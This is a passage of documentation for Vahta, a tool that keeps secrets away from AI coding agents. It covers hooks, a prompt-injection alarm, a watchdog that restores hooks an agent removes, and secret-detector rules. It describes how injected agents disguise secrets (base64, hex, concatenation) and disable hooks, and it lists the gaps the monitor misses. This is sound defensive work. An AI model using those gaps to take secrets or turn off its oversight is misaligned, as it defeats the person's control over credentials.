alarm = "warn"          # or "lock": what the injection alarm does (see below)

guard = "on"            # or "off": the hook watchdog (below); unset until `vahta setup` asked
hook_tool = "block"     # or "observe": a secret in a tool call is let through and reported
unlock = "last"         # or "password", or "device:NAME": the method tried first (below)

[unlock_vault]          # the same, for one vault (its id in hex); beats the line above
5f0c2d6a9e1b4c37a8d2e4f6b1c3a5d7 = "device:pixel"
```

A misspelt key is an error, not a silent default. On Linux the window opens in
the first terminal that works: `VAHTA_TERMINAL` if set, else `terminal` from the
config, else `$TERMINAL`, else the first of the table Vahta carries that is
installed (your desktop's own first). Name yours with the flag that makes it run a
command if it is not found: `terminal = "alacritty -e"`.

### Lock triggers

`lock_on_sleep` ends sessions when something says the person has left. Each way
of finding out is a *lock source*; this build has two on Linux: `logind`
(suspend, `loginctl lock-session`, a desktop that sets `LockedHint`) and
`hyprland` (a lock screen on Hyprland, by asking the compositor). `lock_sources`
picks among them by name: unset means every source in the build, a list means
only those, `[]` means none. A name the build does not know is written to the
journal and ignored. The Hyprland source is the cargo feature `lock-hyprland`,
on by default; `cargo build --no-default-features` leaves it out.

**Any other locker, with no code.** `vahta lock --all` needs no password (ending
a session never needs one), so anything that can run a command when the screen
locks or the machine idles can be a trigger. Put it in the locker's own hook:
hypridle's `lock_cmd` (`lock_cmd = vahta lock --all; pidof hyprlock || hyprlock`),
`xss-lock -- sh -c 'vahta lock --all; your-locker'`, or a sway, i3 or Omarchy
hook.

**Adding a source (for maintainers).** Sources live in
`crates/daemon/src/lock/`, one file each. Write `lock/<name>.rs` with a type that
implements `LockSource`: a stable `name()`, and `run(self: Box<Self>, sink)`,
which runs in its own thread until `sink.stopping()`, or returns at once after
`sink.note("unavailable", why)` if it does not apply here. It calls
`sink.lock(why)` to end every session and journal the reason. `sink` is all it
gets: it cannot see sessions, keys or the prompt surface. Then add one line to
`sources()` in `lock/mod.rs`, behind the `cfg` that says where it applies (and a
cargo feature, if it should be optional). The core does not change.

### Files

- `.vahta/` in a project: the vault, its lock and its backups, with a `.gitignore`
  of `*`. `vahta.toml` (the committed list of names) sits beside it.
- `<data dir>/vahta/`: what this machine remembers about each vault (the pinned
  owner key and the highest generation seen, so a swapped or rolled-back vault is
  refused), and `journal.jsonl`.
- `journal.jsonl`, mode 0600: each line is a time, an event, the session and its
  parent, the vault, the secret *names*, the peer's program and pid, the result
  and reason, and use counts. **Never a value and never a password.**

The agent hook refuses to read, edit, write, move, copy, remove or redirect into
any `.vahta/` directory or `<data dir>/vahta/`, and says which path.

It also refuses `vahta reveal`, `vahta copy` and `vahta _surface` (and `vh …`)
from an agent, however they are spelled: a window on the screen can be
captured and the clipboard can be read, so these are for the person, in their
own terminal. `vahta setup --claude` writes the same commands into Claude
Code's `permissions.deny` as a second layer; Codex and Cursor have no command
deny list, so there the hook is the only layer.

The hook also cuts secrets out of what a tool returns before the model sees
it: the detector's likely finds, and, with the daemon running, every value it
holds for that agent. [hooks.md](hooks.md) says how, and how the agent asks the
person for what was cut.

Each refusal is also reported to the daemon, which journals it as
`hook_report`: what kind of thing the agent tried (a secret-shaped value and
the rule that found it, one of Vahta's files, a command for the person), never
the value or the command text. With no daemon running, the hook appends the
report to `<data dir>/vahta/hook-spool.jsonl` (mode 0600, at most 1 MiB; past
that new reports are dropped), and the next daemon journals and empties it.
Refusals of the person's own prompt are not reported. These reports are the
evidence for the injection alarm.

## Devices, factors, re-keying and recovery

A vault can be opened by more than the password. Each way is a **slot** in the
vault file that holds the vault key wrapped under a key that way can produce.
The password and the recovery key are two kinds; a **paired phone** is a third.
The daemon does not know the kinds: it asks the registry in `crates/auth`, which
tries the **current method** first (by default the one enrolled last: the
phone, once one is paired) and then the others, ending with the password
window.

**The master password always works.** However the phone behaves (away, slow,
denying, answering wrongly), the window is there and the password opens
everything except what only the password may do (managing devices, below).

### The current unlock method

A person may have several ways in: the password, the recovery key (its own
command, never part of an ordinary unlock), and one or more phones. The
**current method** is the one tried first:

* `unlock = "last"` (the default, also when nothing is set): the method
  enrolled last, by the creation time of its slot among the ordinary methods.
  The password counts from when the vault was made, so with no phone paired it
  is the password, and a phone paired later takes over. Using a phone (its slot
  is written again after every use), changing the password or re-keying does
  not count as enrolling: a slot keeps its creation time.
* `unlock = "password"`: the password window first. A phone is not asked.
* `unlock = "device:NAME"`: that phone first (a name in any case, or the start of
  its id, four hex characters or more); if it is away or times out, the
  next methods follow, the password window last. A name that matches no phone
  with a slot in this vault (the phone was removed) is treated as `last`.

The line `unlock` applies to every vault; an entry in `[unlock_vault]`, keyed by the
vault id in hex, applies to that vault and beats it. A phone's name only means
something in the vault it is paired with, so `vahta config unlock device NAME` sets
the entry of the vault of the current project (it refuses a name the vault does not
have, or a phone with no way to open it); `--global` sets the general line, and
`default` forgets the vault's own entry. With no argument the command shows the
setting, where it comes from, the current method and the whole order.
`vahta devices` marks the current phone (`UNLOCK` column) and ends with the same
line.

**While the phone is asked, the window says so.** The window opens at once and
shows `Confirm on your phone "NAME"... Waiting.` with **Enter to use the
password instead**. Pressing Enter stops asking the phone and goes to the
password prompt; when the phone answers first the window moves on by itself. A
phone that is out of reach, silent, or answers wrongly still falls back to the
password. A **no on the phone is an answer**: the command ends with `refused on
the phone; nothing was done` (exit 4, like cancelling) and the password window
is not opened to override it. The same holds for an approval (`run --ask`): a
no on the phone refuses it at once, and the window that was asked with it is
closed. The master password still works through an explicit unlock.

**Changing it needs no password.** It only orders methods that are already there,
and the master password opens the vault whatever it says, so no setting can lock
the person out or open anything that was closed. Whoever can write `config.toml`
can already do worse to the person (for example turn `lock_on_sleep` off). The
daemon reads the setting from the file at each unlock, so a change applies at the
next one without restarting it. A policy that needs the password alone
(`password_only`) never offers a phone, whatever is current. A fuller choice
(a picker, per-action choices) is for the TUI and the GUI.

### Pairing and what a phone can do

`vahta devices pair NAME --for 90d` asks for the master password, then opens the
**pairing code** in the same window: a QR code and, under it, the same code as a line
of text. The Vahta app on the phone scans it (or takes the text), shows this
computer's name for the person to confirm, and the two connect over Bluetooth LE or
the local network, whichever is up first. The code works for five minutes and once;
closing the window cancels. The phone is then recorded in the vault's signed device
list with a slot of its own. How the phone is reached (its channel key, where it was
last seen) is kept beside the daemon's data, in `link/<vault id>/` (a transport
identity, mode 0600, not a vault secret; see [phone-link.md](phone-link.md)), so a
copy of the vault on another computer does not reach the phone and asks for the
password. `revoke` and `lost` delete it. Bluetooth is available on Linux; on
macOS and Windows the phone link uses the local network only for now. A phone's
access lasts a limited time (1 minute to 365
days, default 90 days). While it lasts, the phone can:

* **open the vault**, with its biometric check, for an each-use run or a
  session, with no password window. The request is a structure (action, secret
  names, project, command, your agent's unverified label, a one-time number and
  an expiry), the phone draws its own screen from it, and its answer is signed
  with a key that lives in the phone's hardware keystore. The daemon accepts the
  answer only for that request, once, before it expires, from the device the
  vault lists;
* **say yes** to a question the window would ask (extend a session, allow a
  command once). The window and every phone in reach are asked at the same time;
  the first answer wins and the others are closed.

A phone can not manage devices: `pair`, `extend`, `revoke` and `lost` take the
master password and nothing else (a stolen phone must not be able to keep
itself alive).

After every use the phone's slot is **written again with a new one-time key**
(`ECDH` of a fresh ephemeral key with the phone's public key), so a shared
secret captured once opens the file as it was, and no later one.

### Factors: what each action needs

What an action needs is data, in `crates/auth/policy/factors.toml`, compiled in:

| Value | Meaning |
|---|---|
| `presence` | someone at the machine says yes (a window click) |
| `knowledge` | the master password, or a phone |
| `possession_biometric` | a phone with its biometric check, or the master password |
| `password_only` | the master password only |

Most actions need `knowledge`; extending a session and `alarm_lock` need
`presence`; device management needs `password_only`. A row per **category** can
override an action (for example the `payment` category: each-use runs, reveal
and copy want `possession_biometric`). The master password satisfies every row
except `password_only`.

### `vahta devices extend`, `revoke`, `lost`

* `extend ID --for 90d`: the device's access ends 90 days from now.
* `revoke ID`: removes the device and its slot. **A copy of the vault file made
  earlier still opens with that phone's key**; revoking only stops it opening
  the file from now on.
* `lost ID`: the phone is lost or stolen. It removes the device **and re-keys the
  vault**. Re-keying draws a new vault key, seals every secret again under new
  data keys, re-certifies the recipients, wraps the password slot and the other
  devices' slots for the new key, drops every other slot, and makes a **new
  recovery key** (shown once, in the window, before anything is written; the old
  paper key stops working, destroy it). Open sessions end. A copy of the old file
  still opens with the lost phone's key, but it is only the old vault: it holds
  nothing newer than the copy, and rotating the secrets themselves at their source
  is still up to you.

`ID` is the device's name or the start of its id.

**Other machines.** A machine that has opened the vault pinned its owner key.
This machine's pin is moved to the new owner key by the re-key. The re-key also
writes a **successor record** into the file (format 3 and later): the old owner key signs
"the owner is now this key, owner generation N". The last four records are kept,
each starting where the one before ended. Another machine that pinned the old key
then does not refuse the file for good, but it does not trust the record alone:

1. the record must link the pinned key to the file's owner (each step signed by the
   previous key, the generations rising), else it is refused as before ("the
   vault's owner key differs from the one this machine saw before");
2. the vault must **open on this machine with the person's own secret** (the
   password, the recovery key or a phone), as for any unlock; and
3. a window must say: "This vault's owner key was changed on another machine
   (re-key after a lost device, DATE). Accept the new key on this machine?"
   *Accept* pins the new key; *Refuse*, closing the window or no answer leaves the
   old pin and the vault stays refused.

Why the confirmation. A vault key that leaked together with a stolen phone and
its fingerprint can sign anything the old owner could, including a successor for
a key the thief chose. The chain only shows that the *old key* approved the new
one, and that is exactly what an attacker holding the old key can fake. Step 2
closes that: the new file must open with a secret the thief does not have (the
new password-wrapped key is not derivable from the old vault key), and step 3
puts the question to the person, who knows whether they re-keyed. A rolled-back
file (a generation below one this machine has seen) is refused before any window.
The answer is journaled (`owner_key_change`). Recipients (people and cloud
members) pinned the owner the same way and follow the chain the same way, with
their own keys in place of a password.

Limits. A machine that was on a key more than four re-keys back finds no link and
must clear its record of the vault (`<data dir>/vaults/<vault id>/state`) by
hand, as before. `vahta list` and `vahta check` read the file without unlocking,
so on such a machine they report the owner change until one unlock has accepted
it. The old record of the machine is not authenticated at that step (its check key
was derived from the old vault key); what is checked is that it pins the old owner
key and a generation not above the file's. A file with a broken or forged chain
does not open at all.

### Recovery

* **Forgot the password:** `vahta recover` asks for the recovery key in a window,
  then a new password (twice). The secrets are untouched and the recovery key is
  the same one.
* **Lost the phone:** `vahta devices lost ID` (above).
* **Both lost:** nothing recovers the vault. Keep the paper key; a phone is a way
  in, not a backup.

### Honest limits

* **A device's expiry is enforced by the daemon, not by cryptography alone.** The
  daemon refuses an expired device record and an expired slot, and the vault
  library refuses an expired slot even with the right key. A copy of the vault
  file together with a phone that still holds its key opens that copy whatever
  its expiry says; `lost` (re-keying) is what makes such a copy stale.
* **The phone's keys are only as safe as the phone's keystore.** The signing and
  key-agreement keys should be hardware-backed (Android StrongBox or the
  Trusted Execution Environment, Secure Enclave) and require biometrics for each
  use. The daemon cannot check this from here; it holds only the public keys.
* **Last used** in `vahta devices` is read from the daemon's journal
  (`device_unlock` and `device_approve` events); a journal that was lost or
  cleared shows nothing.
* While the daemon waits for a phone (up to 30 seconds) the window is already
  open and still empty; the password question appears once the phone has not
  answered.
* The journal records `device_paired`, `device_extended`, `device_revoked`,
  `device_lost_rekey`, `device_unlock`, `device_approve`, `rekey`, `recover` and
  `owner_key_change`,
  with the device's id and name, never a key, a password or a recovery key.

## Injection alarm

An agent that has been prompt-injected, or has wandered far from its task,
tends to leave a trail at the hook: a secret-shaped value that is refused and
then retried base64-encoded, a touch of Vahta's own files, a command meant for
the person. One of those is a mistake. Several in a few minutes is a pattern,
and the daemon watches for it.

### Values Vahta holds, in other encodings

When a session is opened (or a `vahta run` is given its values), the daemon
builds, for each value of at least 8 bytes, the forms an agent might write it
in: raw; base64 (standard and URL-safe, padded or not, wherever it sits inside
a longer encoded text); hex in either case; URL-encoded (the usual encoding,
and every byte as `%XX`); reversed. They live in
memory only, in overwritten-on-drop buffers, exactly as long as the keys the
session already holds, and are dropped with the session or the run. They are as
sensitive as those keys.

Two things use them:

- **Output.** The hook's output scan and the scrubber of `vahta run` cut a form
  out as they cut the value, with a label that names the form:
  `***REDACTED(NAME (base64))***`.
- **Tool calls.** Before a tool runs, the hook sends its text to the daemon
  (`ToolCheck`) when one is running, within the hook's usual 300 ms. A hit is
  refused. The agent is told only the form ("Blocked: this command contains a
  value Vahta holds (base64). Use `vahta run`."); the secret's name goes to the
  person, in the hook's message and the journal. With no daemon, nothing is
  checked. A tool call's text is also looked at with its `%XX` runs decoded
  (so a value encoded in full, in either case, in part or in a mix, is found
  inside a sentence or a URL; reported as URL-encoded) and with the string
  literals the detector would join folded (`'ab''cd'`, `"ab" + "cd"`; reported
  as concatenation). Both are bounded by the text's own size. Output redaction
  uses the precomputed forms only, which include the every-byte percent
  encoding but not the folded or partly decoded ones. A call over 256 KiB is checked in overlapping pieces, and only its
  first 2 MiB; a form split across a piece boundary and longer than the 8 KiB
  overlap is missed.

Not covered: values split by the program's own formatting (other than literals
joined as above), compressed,
encrypted, or carried by any other transformation, and values shorter than 8
bytes.

### Scoring

Every hook report, live or spooled, and every `ToolCheck` hit counts toward a
score per agent: the harness's session id when its payload has one, else the
agent process. Weights: a refused secret 1, one let through in observe mode
0.5, a refused secret that was hidden (base64, concatenation, hex, percent-encoding) 4, a held
value in a tool call 6, a touch of Vahta's own files 3, a command for the person
(`reveal`, `copy`) 2, a change to the hook settings 4, a `vahta run` or
`vahta http` refused by a secret's rules 3 (6 when the refused program is a
network tool, a shell or an interpreter). The score is the sum over
the last 10 minutes. At 6 the alarm goes off, at most once per agent per 10
minutes. A held value in a tool call is enough alone; so are two disguised
secrets, one refused `curl` (or shell, or interpreter) and any two refusals by
rules. A secret that has no rules yet is a setup issue, not an attack: that
refusal only ever counts as one of the two. A run refused for rules is shown to
the person as "a run of `curl` with NAME (refused by its rules)"; the agent's
reply is the usual refusal and hint, nothing about the alarm. A run the person
declined in an `--ask` window does not count.

### What happens

- `alarm = "warn"` (the default) opens a window, "Suspicious agent behaviour":
  *This looks like prompt injection or an agent far outside its task: {what was
  seen, no values}. Lock Vahta sessions now, then stop or restart the agent.*
  with **Lock all sessions** and **Ignore for this agent session**. With no
  answer, nothing happens.
- `alarm = "lock"`, or no way to open a window (headless, cloud), or a window
  that fails while asking: every session ends at once, and, where a window can
  be opened, it says what happened.

The journal records `alarm` (who, score, what, and the action taken) and
`alarm_ignored`. `vahta daemon status` and `vahta sessions` show "alarm raised
at ..." until the next `vahta unlock`.

## Hook watchdog

The hook is only as good as its entry in the agent's settings. An agent that can
edit `~/.claude/settings.json` can delete the hook that watches it, or set
`"disableAllHooks": true`. Three layers answer that, from the cheapest to the
strongest.

### 1. The hook refuses the edit

Before the tool runs, `vahta-hook` refuses what would weaken its own entries:

- **Edit, MultiEdit, Write and Codex's `apply_patch`** on a file that holds hooks
  or the switches that turn them off: each harness's hook config
  (`~/.claude/settings.json`, `~/.codex/hooks.json` or `$CODEX_HOME`,
  `~/.cursor/hooks.json`), any Claude Code project's `.claude/settings.json` and
  `settings.local.json`, Codex's `config.toml`, Vahta's own `config.toml` (its
  `guard` line) and the administrator-policy paths. The edit is judged by what the
  file would become: one that keeps our entries (a new permission, say) is allowed;
  one that removes them, leaves the file unreadable, sets `disableAllHooks` or
  `hooks = false` is refused.
- **Shell commands** that write, remove, move or copy onto such a file: `sed -i`,
  `rm`, `mv`, `cp`, `tee`, `truncate`, a `>` redirect (`jq ... > file`), and
  `python -c` / `node -e` and the like that name one. Reading is not touched.

The agent is told: *Changing hook settings goes through Vahta: ask the person with
`vahta hooks pause --for 1h --reason "..."`.* Each refusal is reported as a
`hook_tamper` signal. This is best effort, in the way of the file-read guard: a path
built by a script, a glob or a command substitution is not followed.

### 2. `vahta hooks pause`

`vahta hooks pause [--for DURATION] [--reason TEXT] [--harness NAME]...` is the
one door. A window shows the person the harnesses, the time (at most 8 hours),
*while paused, Vahta does not see what the agent does*, and the agent's reason,
marked unverified; it needs the vault password (the vault of the caller's
project, else of a project the daemon has seen). With no vault known there is no
password, so the request is refused (exit 3) and the person is told to run
`vahta setup --uninstall` or `vahta setup --guard off` in their own terminal. On approval the hooks are taken out of those harnesses and
`pause.json` is written to the data directory, which the hook already keeps agents
out of. `vahta hooks resume` puts them back now and needs no password (it only
restores protection). `vahta hooks status` lists the pauses. Journal:
`hooks_paused`, `hooks_resumed`, and `hooks_restored` when the time is up.

### 3. `vahta _guard`: the watchdog

A small process, separate from the daemon and outliving it, that **only watches
the hook settings** of the three harnesses. It holds no vault key (it never opens a
vault), opens no network socket and reads only the files it watches: the harness
hook configs, Claude Code settings of the projects the daemon has seen
(`projects.json` in the data directory, added to on `run` and `unlock`), and
Codex's `config.toml`. One runs per user (`guard.lock` in the runtime directory).
Every two seconds it looks at the files' modification times, and re-reads those
that changed.

It calls it tampering when a harness that had Vahta's hooks loses some or all of
them (the set is remembered in `guard-state.json`), when the hook program they
point to is gone, when `disableAllHooks` is `true` in a Claude Code settings file,
or when `[features] hooks = false` appears in Codex's `config.toml`. It does *not*
call it tampering when an entry merely differs from what this vahta would write, or
points to another `vahta-hook` that exists. A harness with an unexpired pause is
not watched.

On tampering it asks the daemon (starting it if need be), whose window says what
was found and offers **Restore**, **Keep off for 1 h (password)** and **Turn off
protection (password)** (with no vault known only **Restore**, and a line saying
that to keep them off the person runs `vahta setup --guard off` in their own
terminal). With no answer in two minutes, or if it cannot ask, it
restores. Restoring is `vahta setup`'s own install (the backup and the atomic
write are reused); for `disableAllHooks` it removes the key. Journal:
`hook_tamper`, then `hook_restored`, `hook_tamper_kept` or `guard_off`.

Choosing *Keep off* writes a one-hour pause; the watchdog puts the hooks back when
it ends.

### Consent, autostart and reminders

The watchdog runs only if the person said yes. After an install, `vahta setup` on
a terminal explains it and asks:

> A small background process that only watches the hook settings of Claude Code,
> Codex and Cursor. It holds no keys, never connects to the internet, does not
> watch you or your files. If an agent or a tool removes Vahta's hooks, it asks
> you before putting them back.

`vahta setup --guard on|off` answers without a terminal. The answer is `guard =
"on" | "off"` in `config.toml`. With `on`, setup writes a login autostart (Linux:
the systemd user unit `~/.config/systemd/user/vahta-guard.service`, enabled with
`systemctl --user enable --now`; macOS: the launch agent
`~/Library/LaunchAgents/dev.vahta.guard.plist`; Windows: the `VahtaGuard` value
under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) and starts the
watchdog now; the daemon also starts it whenever it starts. With `off`, setup stops
it and removes the autostart. `vahta setup --uninstall` stops the watchdog and
removes the autostart *before* it removes the hooks (and, when no harness keeps
Vahta's hooks, forgets the answer so the next install asks again).

When the answer is `off`, the SessionStart hook says so at most once a week, and
once a month after three declines (`guard_declines` and `guard_reminded_at` in
`<data dir>/state.json`). `vahta setup` (the status table) and `vahta check` (on
stderr, text mode) always say where the watchdog stands.

### Administrator policy (`vahta setup --managed`)

Hooks in a policy that an administrator owns cannot be switched off by the user's
or a project's settings. `vahta setup --claude|--codex|--cursor|--all --managed`
writes Vahta's hooks there, `--dry-run` shows the content without writing. It
never escalates by itself: when it cannot write the file it prints the content and
the `sudo ... tee` command to run (on Windows, to put the content in the file from
an administrator prompt) and exits 1. Paths and sources (read 2026-10-08):

| Harness | File | Notes |
|---|---|---|
| Claude Code | Linux/WSL `/etc/claude-code/managed-settings.json`; macOS `/Library/Application Support/ClaudeCode/managed-settings.json`; Windows `C:\Program Files\ClaudeCode\managed-settings.json` | The hooks are the same JSON as in `settings.json`. Managed settings sit above every user, project and local setting, `--settings` included. Claude Code does not read the older `C:\ProgramData\ClaudeCode` path. <https://code.claude.com/docs/en/managed-settings> |
| Codex | Linux/macOS `/etc/codex/requirements.toml`; Windows `%ProgramData%\OpenAI\Codex\requirements.toml` | Admin-enforced requirements users cannot override; hooks are `[[hooks.<Event>]]` tables, and `[features] hooks = true` pins hooks on. Appended to an existing file, never rewritten. <https://learn.chatgpt.com/docs/enterprise/managed-configuration> |
| Cursor | Linux/WSL `/etc/cursor/hooks.json`; macOS `/Library/Application Support/Cursor/hooks.json`; Windows `C:\ProgramData\Cursor\hooks.json` | Enterprise hooks, the highest source ("Enterprise, Team, Project, User"). Cursor's page does not say in so many words that users cannot disable them. <https://cursor.com/docs/agent/hooks> |

Not done: the watchdog does not watch the managed files (changing them needs
administrator rights, and it could not restore them), and Cursor has no known
switch that turns user hooks off, so there is nothing for the watchdog to check
beyond the entries themselves.

## Detector rules

The hook refuses a tool call that carries a secret-shaped value. What it looks
for, in this order, the first hit deciding:

1. **Vendor prefixes** (11 of them, in `vahta-detect`): Anthropic, OpenAI, AWS
   access key ids, GitHub, GitLab, Slack, Google, Stripe, npm.
2. **Data rules** (`crates/rules`, about 400): vendor token shapes imported from
   gitleaks (MIT) first, then those Betterleaks and Veles rules that Kingfisher
   carries and gitleaks lacks (MIT, Apache-2.0). They are data in
   `crates/rules/rules/imported.toml`, generated by
   `cargo run -p vahta-rules --example import` and never edited by hand; our own
   rules and the samples that test them are in `crates/rules/rules/vahta.toml`.
   Every rule names its true origin in `source`, and the licence texts are in
   `crates/rules/NOTICE`. Keyword-free generic rules (gitleaks'
   `generic-api-key`) are left out: the name matcher below covers them.
3. **Structural rules** (code, `crates/detect/src/structural.rs`): a password in
   a connection string (`postgres`, `mysql`, `mariadb`, `redis`, `mongodb`,
   `amqp`, `mssql`, `clickhouse`, `ftp`), a password given to a program (`mysql
   -pVALUE`, `docker login -p`, `sshpass -p`, `htpasswd -b`, `smbclient -U
   user%pass`, `curl -u user:pass`, `wget --password`, `PGPASSWORD=`, `aws
   configure set`), and a PEM or PGP private-key header, even without a body.
   `${VAR}`, placeholders and marked test values (`fake-plain-value-1`) pass. A
   marked test value is spelled as words and short numbers with a marker word
   among them; a marker in front of a random tail (`fake-` and 28 random
   characters) is not one, and is refused like any other secret there, in a
   connection string, an assignment or a `--password=` alike.
4. **Names that mean secret**: `API_KEY=`, `AWS_SECRET_ACCESS_KEY=`, `--token
   VALUE`, and a Bearer value.
5. **Hidden values**, only when nothing above hit: runs of base64 (24 or more
   characters) or hex (40 or more) are decoded once and looked at again, and
   string pieces that a shell or a language joins (`'ab''cd'`, `"a" + "b"`) are
   joined and looked at again. Such a hit always blocks, whatever the rules'
   modes, and tells the person that the value was hidden.

**What each side is told.** The agent gets the category and the fix ("Blocked:
this looks like a password in a connection string. Put secrets in Vahta and use
`vahta run -- ...`"), never the rule. The person gets the rule id and what it
looks for, and for a hidden value the form it was hidden in.

**Observe mode.** `hook_tool = "observe"` lets every plain find through and
reports it to the daemon (as `observed`, or in the spool when no daemon runs).
A rule can carry `mode = "observe"` to do the same for itself. A hidden value,
the commands only the person may run, and Vahta's own files are refused in either
mode.

**Limits** (constants in the code, so the cost of a call is known before the
text is read): the rules read a text in windows of 1 MiB (`MAX_SCAN_BYTES`) that
overlap by 4 KiB, up to 8 MiB (`MAX_TOTAL_BYTES`), so padding cannot push a secret
out of reach; past 8 MiB the tail is covered only by the vendor prefixes, the
structural rules and the name matchers, which have no size limit; at most 32 rules compile and
run for one text (`MAX_RULES_PER_CALL`), the ones with the longest keyword hit
first; no rule's regex may compile past 1 MiB (`REGEX_SIZE_LIMIT`); at most 16
base64 runs, 16 hex runs and 16 percent-encoded runs of 64 KiB each, and 64
joined-literal chains, are looked at. A truncated scan is reported to a running daemon as `scan_truncated`.
The evasion pass (`vahta-detect`, `evasion.rs`) runs only when nothing else
hit, undoes each form once, and scans the result with the same rules, in its
context (the name, the `Bearer`, the flag in front of it): a percent-encoded run
is decoded when it has at least 8 `%XX` escapes that are at least half of its
bytes and the result is text, so `%20` in a path is left alone; a chain of
quoted literals, adjacent, joined by `+` or `.`, or Bash's `$'ab'$'cd'`, is
joined. A hit is always a block, reported as `base64`, `hex`, `encoded` (for
percent-encoding) or `concat`. This is hygiene for values the daemon does not
hold; for a held value the guarantee is the daemon's own check above. Marked
test values (`fake-...`) and placeholders stay allowed in every form.
The hook costs a few milliseconds more than it did before the rules:
`cargo run --release -p vahta-hook --example latency` prints the table.

**Adding or changing a rule.** Put a hand-written rule in `vahta.toml`:

```toml
[[rules]]
id = "vahta.example"
source = "vahta"
description = "What it looks for, for the person"
category = "an example token"          # for the agent, with its article
class = "other"                        # payment | cloud | other
keywords = ["exmpl_"]                  # lowercase; the rule runs only if one occurs
regex = 'exmpl_[A-Za-z0-9]{32}'
entropy = 3.0                          # optional floor, bits per byte
mode = "block"                         # or "observe"
[[rules.tests]]
hit = true
parts = ["exmpl", "_", "...pieces..."] # joined at load; never write a whole secret-shaped value
```

A sample for an imported rule goes in a `[[samples]]` table with `rule = "<id>"`.
`cargo test -p vahta-rules` checks that every regex compiles within the limit,
every sample behaves, every keyword occurs in what its regex matches, and that
the repository's own files raise no blocking hit. CI runs those tests only when
`crates/rules/` changes.

## What this does not protect against

Vahta is built so that an agent cannot *ask* for a secret. It cannot stop everything
an agent running as you could *do*. Read this before relying on it.

- **The command sees the secret.** The command `vahta run` starts has it in its
  environment, and can print it, send it somewhere, or write it to a file. The
  scrubber catches a value that appears in the output as it is, and in the
  encodings an agent is likely to try (base64, hex, URL-encoded, reversed; see
  below); it does **not** catch one that is split by the program's own
  formatting (line-wrapped base64) or transformed any other way. Run commands you trust with secrets you can afford to have used.
- **`/proc/<pid>/environ`.** On Linux, a process of the same user can read the
  environment of another of its processes. While a command that was given a secret
  runs, another process running as you (including an agent's other tools) can read
  it from there. The daemon's own memory is protected from that (not dumpable); a
  command it started is not.
- **Revocation is not recall.** Ending a session, or the daemon, stops *future*
  uses. It cannot take a value back from a command that is already running, nor
  from output that already left.
- **Same user.** Everything runs as you. A hostile process of yours that can
  attach to the daemon would be refused a session it has no password for, but it
  can run what you can run. The window is a terminal window; a program that can
  watch or type into your terminals can watch or type into it.
- **Command rules are narrower than they look.** See "What binding does not
  do": `allow` is the guard, `deny` only slows an agent down, and an allowed
  program can still pass a secret on.
- **No terminal for the command.** A command that needs a terminal gets pipes, not
  a terminal.
- **The anchor is a process, not a person.** A session covers the process it
  belongs to and everything it starts. If you unlock from inside an agent, the
  agent and its tools can use the secrets until the session ends.
- **Sleep and lock.** Ending sessions on suspend and screen lock is Linux only.
  Under Hyprland the lock screen is noticed within about two seconds, by asking
  the compositor while a session is open. A screen locker on another compositor
  that does not tell logind is not heard unless it runs `vahta lock --all` (see
  Lock triggers). macOS and Windows do not do it yet.
- **The hook is a speed bump.** The protection of Vahta's own files in the agent
  hook covers the common ways of reading or changing them (the read, edit and
  write tools, common shell readers, `rm`, `mv`, `cp`, redirections). It does not
  cover globs, `$VARS`, command substitution, interpreters (`python -c`), or a
  program that is handed a directory containing a vault. The vault's own
  encryption is what holds when the hook does not.
